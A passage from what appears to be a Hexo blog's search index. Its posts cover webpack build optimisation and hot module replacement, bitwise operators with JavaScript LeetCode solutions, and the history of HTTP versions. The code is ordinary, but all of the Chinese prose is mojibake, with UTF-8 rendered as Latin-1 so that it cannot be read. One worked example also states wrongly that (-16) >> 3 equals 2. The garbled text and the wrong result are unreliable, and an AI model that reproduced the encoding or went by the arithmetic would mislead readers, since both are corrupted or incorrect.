‡</h4><p>ç¼©å°loaderåº”ç”¨èŒƒå›´ï¼Œé™å®šåªåœ¨ src ç›®å½•ä¸‹çš„ js/jsx æ–‡ä»¶éœ€è¦ç» babel-loader å¤„ç†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rules: [ </span><br><span class="line">  &#123;</span><br><span class="line">    test: <span class="regexp">/\.jsx?/</span>,</span><br><span class="line">    include: [ </span><br><span class="line">        path.resolve(__dirname, <span class="string">'src'</span>), </span><br><span class="line">    ],</span><br><span class="line">    use: <span class="string">'babel-loader'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">],</span><br></pre></td></tr></table></figure><h4 id="4-3-åˆ†åŒ…ï¼šé¢„ç¼–è¯‘èµ„æº"><a href="#4-3-åˆ†åŒ…ï¼šé¢„ç¼–è¯‘èµ„æº" class="headerlink" title="4.3 åˆ†åŒ…ï¼šé¢„ç¼–è¯‘èµ„æº"></a>4.3 åˆ†åŒ…ï¼šé¢„ç¼–è¯‘èµ„æº</h4><h4 id="4-4-å¤šè¿›ç¨‹å¹¶è¡Œå‹ç¼©"><a href="#4-4-å¤šè¿›ç¨‹å¹¶è¡Œå‹ç¼©" class="headerlink" title="4.4 å¤šè¿›ç¨‹å¹¶è¡Œå‹ç¼©"></a>4.4 å¤šè¿›ç¨‹å¹¶è¡Œå‹ç¼©</h4><h4 id="4-5-ä¼˜åŒ–æ˜¾ç¤ºæ—¥å¿—"><a href="#4-5-ä¼˜åŒ–æ˜¾ç¤ºæ—¥å¿—" class="headerlink" title="4.5 ä¼˜åŒ–æ˜¾ç¤ºæ—¥å¿—"></a>4.5 ä¼˜åŒ–æ˜¾ç¤ºæ—¥å¿—</h4><p><br></p><h3 id="5-å®ç°åˆ†åŒ…"><a href="#5-å®ç°åˆ†åŒ…" class="headerlink" title="5. å®ç°åˆ†åŒ…"></a>5. å®ç°åˆ†åŒ…</h3><p>é»˜è®¤çš„åˆ†åŒ…è§„åˆ™ï¼š</p><ul><li>åŒä¸€ä¸ª entry ä¸‹è§¦è¾¾åˆ°çš„æ¨¡å—ç»„ç»‡æˆä¸€ä¸ª chunk</li><li>å¼‚æ­¥æ¨¡å—å•ç‹¬ç»„ç»‡ä¸ºä¸€ä¸ª chunk</li><li>entry.runtime å•ç‹¬ç»„ç»‡æˆä¸€ä¸ª chunk</li></ul><p><br></p><h3 id="6-çƒ­æ›´æ–°åŸç†"><a href="#6-çƒ­æ›´æ–°åŸç†" class="headerlink" title="6. çƒ­æ›´æ–°åŸç†"></a>6. çƒ­æ›´æ–°åŸç†</h3><p>Webpack çš„çƒ­æ›´æ–°åˆç§°çƒ­æ›¿æ¢ï¼ˆHot Module Replacementï¼‰ï¼Œç¼©å†™ä¸º HMRã€‚ è¿™ä¸ªæœºåˆ¶å¯ä»¥åšåˆ°ä¸ç”¨åˆ·æ–°æµè§ˆå™¨è€Œå°†æ–°å˜æ›´çš„æ¨¡å—æ›¿æ¢æ‰æ—§çš„æ¨¡å—ã€‚</p><p>HMR çš„æ ¸å¿ƒå°±æ˜¯å®¢æˆ·ç«¯ä»æœåŠ¡ç«¯æ‹‰å–æ›´æ–°åçš„æ–‡ä»¶ï¼Œå‡†ç¡®çš„è¯´æ˜¯ chunk diff (chunk éœ€è¦æ›´æ–°çš„éƒ¨åˆ†)ã€‚</p><p>å®é™…ä¸Š WDS ä¸æµè§ˆå™¨ä¹‹é—´ç»´æŠ¤äº†ä¸€ä¸ª Websocketï¼Œå½“æœ¬åœ°èµ„æºå‘ç”Ÿå˜åŒ–æ—¶ï¼ŒWDS ä¼šå‘æµè§ˆå™¨æ¨é€æ›´æ–°ï¼Œå¹¶å¸¦ä¸Šæ„å»ºæ—¶çš„ hashï¼Œè®©å®¢æˆ·ç«¯ä¸ä¸Šä¸€æ¬¡èµ„æºè¿›è¡Œå¯¹æ¯”ã€‚å®¢æˆ·ç«¯å¯¹æ¯”å‡ºå·®å¼‚åä¼šå‘ WDS å‘èµ· Ajax è¯·æ±‚æ¥è·å–æ›´æ”¹å†…å®¹ (æ–‡ä»¶åˆ—è¡¨ã€hash)ï¼Œè¿™æ ·å®¢æˆ·ç«¯å°±å¯ä»¥å†å€ŸåŠ©è¿™äº›ä¿¡æ¯ç»§ç»­å‘ WDS å‘èµ· jsonp è¯·æ±‚è·å–è¯¥ chunk çš„å¢é‡æ›´æ–°ã€‚</p><p>åç»­çš„éƒ¨åˆ† (æ‹¿åˆ°å¢é‡æ›´æ–°ä¹‹åå¦‚ä½•å¤„ç†ï¼Ÿå“ªäº›çŠ¶æ€è¯¥ä¿ç•™ï¼Ÿå“ªäº›åˆéœ€è¦æ›´æ–°ï¼Ÿ) ç”± HotModulePlugin æ¥å®Œæˆï¼Œæä¾›äº†ç›¸å…³ API ä»¥ä¾›å¼€å‘è€…é’ˆå¯¹è‡ªèº«åœºæ™¯è¿›è¡Œå¤„ç†ï¼Œåƒ react-hot-loader å’Œ vue-loader éƒ½æ˜¯å€ŸåŠ©è¿™äº› API å®ç° HMRã€‚</p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://webpack.docschina.org/guides/code-splitting/" target="_blank" rel="noopener">ä»£ç åˆ†ç¦»</a></li><li><a href="https://www.jianshu.com/p/e3334a2c08e7" target="_blank" rel="noopener">react-router4ä»£ç åˆ†å‰²</a></li><li><a href="">æå®¢æ—¶é—´-æ·±å…¥æµ…å‡ºWebpack</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ä½è¿ç®—ç¬¦</title>
      <link href="/2021/09/29/LeetCode-%E4%BD%8D%E6%93%8D%E4%BD%9C%E7%AC%A6/"/>
      <url>/2021/09/29/LeetCode-%E4%BD%8D%E6%93%8D%E4%BD%9C%E7%AC%A6/</url>
      <content type="html"><![CDATA[<hr><h3 id="1-ä½æ“ä½œç¬¦"><a href="#1-ä½æ“ä½œç¬¦" class="headerlink" title="1. ä½æ“ä½œç¬¦"></a>1. ä½æ“ä½œç¬¦</h3><p>ä½è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§å°äºåŠ å‡è¿ç®—çš„ä¼˜å…ˆçº§<br>æ“ä½œæ•°åªèƒ½ä¸ºæ•´å‹æˆ–å­—ç¬¦å‹æ•°æ®</p><ul><li><p><em>&amp;</em><br>ä¸ï¼Œå‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸ä¸ã€‚åªæœ‰å¯¹åº”çš„ä¸¤ä¸ªäºŒè¿›ä½å‡ä¸º1æ—¶ï¼Œç»“æœä½æ‰ä½1ï¼Œå¦åˆ™ä¸º0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> &amp; <span class="number">5</span> = <span class="number">1</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">&amp; <span class="number">00000101</span></span><br><span class="line">= <span class="number">00000001</span></span><br></pre></td></tr></table></figure></li><li><p><em>|</em><br>æˆ–ï¼Œå‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸æˆ–ã€‚åªè¦å¯¹åº”çš„ä¸¤ä¸ªäºŒè¿›ä½æœ‰ä¸€ä¸ªä¸º1æ—¶ï¼Œç»“æœä½å°±ä¸º1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> | <span class="number">5</span> = <span class="number">13</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">| <span class="number">00000101</span></span><br><span class="line">= <span class="number">00001101</span></span><br></pre></td></tr></table></figure></li><li><p><em>^</em><br>å¼‚æˆ–ï¼Œå‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æˆ–ï¼Œå½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ï¼Œç»“æœä¸º1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span> ^ <span class="number">5</span> = <span class="number">12</span></span><br><span class="line">  <span class="number">00001001</span></span><br><span class="line">^ <span class="number">00000101</span></span><br><span class="line">= <span class="number">00001100</span></span><br></pre></td></tr></table></figure></li><li><p><em>~</em><br>æ±‚åï¼Œå¯¹å‚ä¸è¿ç®—çš„å„äºŒè¿›ä½æŒ‰ä½æ±‚å</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~<span class="number">1001</span> = <span class="number">0110</span></span><br></pre></td></tr></table></figure></li><li><p><em>&lt;&lt;</em><br>å·¦ç§»è¿ç®—ç¬¦ï¼Œå·¦ç§»nä½å°±æ˜¯ä¹˜ä»¥2çš„næ¬¡æ–¹ã€‚æŠŠ<code>&lt;&lt;</code>å·¦è¾¹çš„è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ï¼Œå³<code>&lt;&lt;</code>å³è¾¹çš„æ•°æŒ‡å®šç§»åŠ¨çš„ä½æ•°ï¼Œé«˜ä½ä¸¢å¼ƒï¼Œä½ä½è¡¥0.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> &lt;&lt; <span class="number">4</span> = <span class="number">16</span></span><br><span class="line">(<span class="number">-1</span>) &lt;&lt; <span class="number">4</span> = <span class="number">-16</span></span><br></pre></td></tr></table></figure></li><li><p><em>&gt;&gt;</em><br>å³ç§»è¿ç®—ç¬¦ï¼Œå³ç§»nä½å°±æ˜¯é™¤ä»¥2çš„næ¬¡æ–¹ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">16</span> &gt;&gt; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">(<span class="number">-16</span>) &gt;&gt; <span class="number">3</span> = <span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-leetcode"><a href="#2-leetcode" class="headerlink" title="2. leetcode"></a>2. leetcode</h3><ul><li><h4 id="åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—"><a href="#åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—" class="headerlink" title="åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—"></a>åªå‡ºç°ä¸€æ¬¡çš„æ•°å­—</h4><p>ç»™å®šä¸€ä¸ªéç©ºæ•´æ•°æ•°ç»„ï¼Œé™¤äº†æŸä¸ªå…ƒç´ åªå‡ºç°ä¸€æ¬¡ä»¥å¤–ï¼Œå…¶ä½™æ¯ä¸ªå…ƒç´ å‡å‡ºç°ä¸¤æ¬¡ã€‚æ‰¾å‡ºé‚£ä¸ªåªå‡ºç°äº†ä¸€æ¬¡çš„å…ƒç´ ã€‚ä½ çš„ç®—æ³•åº”è¯¥å…·æœ‰çº¿æ€§æ—¶é—´å¤æ‚åº¦ï¼Œä¸ä½¿ç”¨é¢å¤–ç©ºé—´æ¥å®ç°ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é™¤äº†æŸä¸ªå…ƒç´ åªå‡ºç°ä¸€æ¬¡ä»¥å¤–ï¼Œå…¶ä½™æ¯ä¸ªå…ƒç´ å‡å‡ºç°ä¸¤æ¬¡</span></span><br><span class="line"><span class="comment">// 2 ^ 3 ^ 2 ^ 4 ^ 4 =&gt; 2 ^ 2 ^ 4 ^ 4 ^ 3 =&gt; 3</span></span><br><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = nums[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">    a ^= nums[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="ä½1çš„ä¸ªæ•°"><a href="#ä½1çš„ä¸ªæ•°" class="headerlink" title="ä½1çš„ä¸ªæ•°"></a>ä½1çš„ä¸ªæ•°</h4><p>è¾“å…¥ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ï¼Œè¿”å›å…¶äºŒè¿›åˆ¶è¡¨è¾¾å¼ä¸­å­—ä½æ•°ä¸º1çš„ä¸ªæ•°(æ±‰æ˜é‡é‡)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¾“å…¥ï¼š00000000000000000000000000001011</span></span><br><span class="line"><span class="comment">// è¾“å‡ºï¼š3</span></span><br><span class="line"><span class="keyword">var</span> hammingWeight = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// å¾ªç¯å³ç§»ï¼Œåˆ¤æ–­äºŒè¿›åˆ¶æœ€ä½ä½æ•°æ˜¯ä¸æ˜¯1</span></span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span> === <span class="number">1</span>) &#123;</span><br><span class="line">            a++</span><br><span class="line">        &#125;</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="2çš„å¹‚"><a href="#2çš„å¹‚" class="headerlink" title="2çš„å¹‚"></a>2çš„å¹‚</h4><p>ç»™å®šä¸€ä¸ªæ•´æ•°(32ä½æœ‰ç¬¦å·æ•´æ•°)ï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­å®ƒæ˜¯å¦æ˜¯2çš„å¹‚æ¬¡æ–¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPowerOfTwo = <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 2çš„å¹‚ä¸€å®šå¤§äº0</span></span><br><span class="line">  <span class="comment">// 2çš„å¹‚ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œä¸€å®šåªæœ‰ä¸€ä½æ•°ç”¨1ï¼Œn = 000100, n-1 = 000011, n&amp;(n-1) = 000000 =0</span></span><br><span class="line">  <span class="comment">// é2çš„å¹‚ n = 001100 , n-1 = 001011, n&amp;(n-1) != 0</span></span><br><span class="line">  <span class="keyword">return</span> (n &gt; <span class="number">0</span>) &amp;&amp; (n &amp; (n - <span class="number">1</span>)) === <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="4çš„å¹‚"><a href="#4çš„å¹‚" class="headerlink" title="4çš„å¹‚"></a>4çš„å¹‚</h4><p>ç»™å®šä¸€ä¸ªæ•´æ•°(32ä½æœ‰ç¬¦å·æ•´æ•°)ï¼Œè¯·ç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­å®ƒæ˜¯å¦æ˜¯4çš„å¹‚æ¬¡æ–¹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isPowerOfFour = <span class="function"><span class="keyword">function</span>(<span class="params">num</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (num === <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">while</span> (a !== <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (num === a) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a &lt;&lt;= <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="æ‰¾ä¸åŒ"><a href="#æ‰¾ä¸åŒ" class="headerlink" title="æ‰¾ä¸åŒ"></a>æ‰¾ä¸åŒ</h4><p>ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸²så’Œtï¼Œå®ƒä»¬åªåŒ…å«å°å†™å­—æ¯ã€‚å­—ç¬¦ä¸²tç”±séšæœºé‡æ’ï¼Œç„¶åå†éšæœºä½ç½®æ·»åŠ ä¸€ä¸ªå­—æ¯ã€‚æ‰¾å‡ºåœ¨tä¸­è¢«æ·»åŠ çš„å­—æ¯ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é€šè¿‡text.charCodeAt() è·å–å­—ç¬¦çš„unicodeç¼–ç ï¼Œsum(t) - sum(s),æ‰¾åˆ°ä¸åŒçš„å€¼çš„ç¼–ç ï¼Œ</span></span><br><span class="line"><span class="comment">// é€šè¿‡String.fromCharCode(num)è·å–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">var</span> findTheDifference = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = <span class="number">0</span></span><br><span class="line">    t.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        total += item.charCodeAt()</span><br><span class="line">    &#125;);</span><br><span class="line">    s.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>)</span>&#123;</span><br><span class="line">        total -= item.charCodeAt()</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(total);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†æ‰€æœ‰å­—ç¬¦ä¸²å¼‚æˆ–èµ·æ¥</span></span><br><span class="line"><span class="keyword">var</span> findTheDifference = <span class="function"><span class="keyword">function</span>(<span class="params">s, t</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> total = <span class="number">0</span></span><br><span class="line">  <span class="keyword">let</span> str = s + t;</span><br><span class="line">  str.split(<span class="string">''</span>).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">    total ^= key.charCodeAt();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode(total);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="äºŒè¿›åˆ¶é“¾è¡¨è½¬æ•´æ•°"><a href="#äºŒè¿›åˆ¶é“¾è¡¨è½¬æ•´æ•°" class="headerlink" title="äºŒè¿›åˆ¶é“¾è¡¨è½¬æ•´æ•°"></a>äºŒè¿›åˆ¶é“¾è¡¨è½¬æ•´æ•°</h4><p>ç»™ä½ ä¸€ä¸ªå•é“¾è¡¨çš„å¼•ç”¨ç»“ç‚¹ headã€‚é“¾è¡¨ä¸­æ¯ä¸ªç»“ç‚¹çš„å€¼ä¸æ˜¯ 0 å°±æ˜¯ 1ã€‚å·²çŸ¥æ­¤é“¾è¡¨æ˜¯ä¸€ä¸ªæ•´æ•°æ•°å­—çš„äºŒè¿›åˆ¶è¡¨ç¤ºå½¢å¼ã€‚è¯·è¿”å›è¯¥é“¾è¡¨æ‰€è¡¨ç¤ºæ•°å­—çš„ åè¿›åˆ¶å€¼ ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> getDecimalValue = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> total = head.val;</span><br><span class="line">    <span class="keyword">while</span>(head.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        head = head.next</span><br><span class="line">        total = total * <span class="number">2</span> + head.val</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="å®ç°åŠ æ³•"><a href="#å®ç°åŠ æ³•" class="headerlink" title="å®ç°åŠ æ³•"></a>å®ç°åŠ æ³•</h4><p>ä¸ä½¿ç”¨è¿ç®—ç¬¦<code>+</code>å’Œ<code>-</code>ï¼Œè®¡ç®—ä¸¤æ•´æ•°a, bä¹‹å’Œ</p></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5a5886bef265da3e38496fd5" target="_blank" rel="noopener">https://juejin.im/post/5a5886bef265da3e38496fd5</a></li><li><a href="https://www.jianshu.com/p/3d92fe1c34af" target="_blank" rel="noopener">https://www.jianshu.com/p/3d92fe1c34af</a></li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>HTTPåè®®è¿›åŒ–å²</title>
      <link href="/2021/08/24/HTTP-1-0-2-0/"/>
      <url>/2021/08/24/HTTP-1-0-2-0/</url>
      <content type="html"><![CDATA[<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP 1.0"></a>HTTP 1.0</h3><ul><li>å¯¹å¤šæ–‡ä»¶æä¾›è‰¯å¥½çš„æ”¯æŒ</li><li>å¼•å…¥çŠ¶æ€ç </li><li>æä¾›Cacheæœºåˆ¶ï¼Œç”¨æ¥ç¼“å­˜å·²ç»ä¸‹è½½è¿‡çš„æ•°æ®</li><li>åŠ å…¥User Agentå­—æ®µï¼Œç»Ÿè®¡å®¢æˆ·ç«¯åŸºç¡€ä¿¡æ¯</li></ul><p><br></p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP 1.1"></a>HTTP 1.1</h3><ul><li><code>Keep Alive</code><br>HTTP/1.0 æ¯è¿›è¡Œä¸€æ¬¡ HTTP é€šä¿¡ï¼Œéƒ½éœ€è¦ç»å†å»ºç«‹ TCP è¿æ¥ã€ä¼ è¾“ HTTP æ•°æ®å’Œæ–­å¼€ TCP è¿æ¥ä¸‰ä¸ªé˜¶æ®µã€‚<br><code>Keep Alive</code>å¯ä»¥åœ¨ä¸€ä¸ªTCPè¿æ¥ä¸Šä¼ è¾“å¤šä¸ªHTTPè¯·æ±‚ï¼Œåªè¦æµè§ˆå™¨æˆ–è€…æœåŠ¡å™¨æ²¡æœ‰æ˜ç¡®æ–­å¼€è¿æ¥ï¼Œé‚£ä¹ˆè¯¥ TCP è¿æ¥ä¼šä¸€ç›´ä¿æŒã€‚</li><li>æµè§ˆå™¨å¯¹äºåŒä¸€åŸŸåï¼Œé»˜è®¤å…è®¸åŒæ—¶å»ºç«‹6ä¸ªTCPæŒä¹…è¿æ¥</li><li>å¢åŠ Hostå­—æ®µï¼šä½¿å¾—ä¸€å°ç‰©ç†ä¸»æœºä¸Šç»‘å®šå¤šä¸ªè™šæ‹Ÿä¸»æœºï¼Œæ¯ä¸ªè™šæ‹Ÿä¸»æœºéƒ½æœ‰è‡ªå·±çš„å•ç‹¬çš„åŸŸåï¼ŒæœåŠ¡å™¨å¯ä»¥æ ¹æ®<code>Host</code>å€¼åšä¸åŒçš„å¤„ç†ã€‚</li><li>å¢åŠ Content-Length</li><li>å¼•å…¥Cookieæœºåˆ¶</li></ul><p><br></p><h3 id="HTTP-1-1-çš„é—®é¢˜"><a href="#HTTP-1-1-çš„é—®é¢˜" class="headerlink" title="HTTP 1.1 çš„é—®é¢˜"></a>HTTP 1.1 çš„é—®é¢˜</h3><ul><li>TCPçš„æ…¢å¯åŠ¨</li><li>åŒæ—¶å¼€å¯äº†å¤šæ¡ TCP è¿æ¥ï¼Œè¿™äº›è¿æ¥ä¼šç«äº‰å›ºå®šçš„å¸¦å®½</li><li>åŒä¸€ä¸ªTCPç®¡é“ï¼ŒåŒä¸€æ—¶åˆ»åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚</li></ul><p><br></p><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP 2.0"></a>HTTP 2.0</h3><ul><li>å¤šè·¯å¤ç”¨<br>ä¸€ä¸ªåŸŸååªä½¿ç”¨ä¸€ä¸ª TCP é•¿è¿æ¥æ¥ä¼ è¾“æ•°æ®ï¼Œä½†æ˜¯å¯ä»¥å¹¶è¡Œè¯·æ±‚</li><li>æœåŠ¡å™¨æ¨é€<br>HTTP/2 è¿˜å¯ä»¥ç›´æ¥å°†æ•°æ®æå‰æ¨é€åˆ°æµè§ˆå™¨ã€‚ä½ å¯ä»¥æƒ³è±¡è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œå½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ª HTML é¡µé¢ä¹‹åï¼ŒæœåŠ¡å™¨çŸ¥é“è¯¥ HTML é¡µé¢ä¼šå¼•ç”¨å‡ ä¸ªé‡è¦çš„ JavaScript æ–‡ä»¶å’Œ CSS æ–‡ä»¶ï¼Œé‚£ä¹ˆåœ¨æ¥æ”¶åˆ° HTML è¯·æ±‚ä¹‹åï¼Œé™„å¸¦å°†è¦ä½¿ç”¨çš„ CSS æ–‡ä»¶å’Œ JavaScript æ–‡ä»¶ä¸€å¹¶å‘é€ç»™æµè§ˆå™¨</li><li>å¤´éƒ¨å‹ç¼©</li></ul><p><br></p><h3 id="HTTP-2-0çš„é—®é¢˜"><a href="#HTTP-2-0çš„é—®é¢˜" class="headerlink" title="HTTP 2.0çš„é—®é¢˜"></a>HTTP 2.0çš„é—®é¢˜</h3><ul><li>ä¸¢åŒ…å¯¼è‡´çš„é˜»å¡é—®é¢˜<br>æœ‰ä¸€ä¸ªæ•°æ®å› ä¸ºç½‘ç»œæ•…éšœæˆ–è€…å…¶ä»–åŸå› è€Œä¸¢åŒ…äº†ï¼Œé‚£ä¹ˆæ•´ä¸ª TCP çš„è¿æ¥å°±ä¼šå¤„äºæš‚åœçŠ¶æ€ï¼Œéœ€è¦ç­‰å¾…ä¸¢å¤±çš„æ•°æ®åŒ…è¢«é‡æ–°ä¼ è¾“è¿‡æ¥ã€‚</li></ul><p>åœ¨ HTTP/2 ä¸­ï¼Œå¤šä¸ªè¯·æ±‚æ˜¯è·‘åœ¨ä¸€ä¸ª TCP ç®¡é“ä¸­çš„ï¼Œå¦‚æœå…¶ä¸­ä»»æ„ä¸€è·¯æ•°æ®æµä¸­å‡ºç°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œé‚£ä¹ˆå°±ä¼šé˜»å¡è¯¥ TCP è¿æ¥ä¸­çš„æ‰€æœ‰è¯·æ±‚ã€‚å½“ç³»ç»Ÿè¾¾åˆ°äº† 2% çš„ä¸¢åŒ…ç‡æ—¶ï¼ŒHTTP/1.1 çš„ä¼ 